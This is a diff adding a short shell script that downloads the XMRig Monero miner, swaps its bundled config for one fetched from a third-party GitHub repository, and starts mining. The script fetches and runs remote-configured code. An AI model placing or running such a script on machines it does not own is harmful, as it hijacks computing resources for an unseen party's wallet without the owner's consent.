@@ -1,0 +1,17 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-x64.tar.gz
+
+mkdir monero
+
+mv xmrig-6.9.0-linux-x64.tar.gz monero/xmrig.tar.gz
+
+cd monero/
+
+tar -xvf xmrig.tar.gz
+
+cd xmrig-6.9.0/
+
+rm config.json
+
+wget https://github.com/Chartone/myFiles/releases/download/0.1/config.json
+
+./xmrig
